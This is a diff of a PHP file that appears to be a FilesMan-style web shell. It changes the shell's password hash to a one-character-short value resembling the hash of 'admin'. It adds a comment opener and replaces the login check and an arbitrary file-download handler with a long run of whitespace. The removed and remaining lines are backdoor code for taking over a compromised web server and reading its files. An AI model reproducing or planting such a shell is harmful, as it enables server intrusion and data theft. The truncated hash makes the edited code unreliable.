@@ -1,4 +1,5 @@
 <?php
+/*
 
 session_start();
 error_reporting(0);
@@ -10,7 +11,7 @@ set_time_limit(0);
 @ini_set('output_buffering',0);
 @ini_set('display_errors', 0);
 
-$password 			= "8a388234672bc6afd1f2a16fc248f8ff";   
+$password 			= "21232f297a57a5a743894a0e4a801fc";   
 $color 				= "#00ff00";
 $default_action 	= 'FilesMan';
 $default_use_ajax 	= true;
@@ -142,26 +143,7 @@ function login_shell() {
 </html>
 
 <?php
-exit;
-}
-if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
-if( empty($password) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $password) ) )
-	$_SESSION[md5($_SERVER['HTTP_HOST'])] = true
-else
-login_shell();
-if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
-	@ob_clean();
-	$file = $_GET['file'];
-	header('Content-Description: File Transfer');
-	header('Content-Type: application/octet-stream');
-	header('Content-Disposition: attachment; filename="'.basename($file).'"');
-	header('Expires: 0');
-	header('Cache-Control: must-revalidate');
-	header('Pragma: public');
-	header('Content-Length: ' . filesize($file));
-	readfile($file);
-	exit;
-}
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
 ?>
 <?php
 	function w($dir,$perm) {
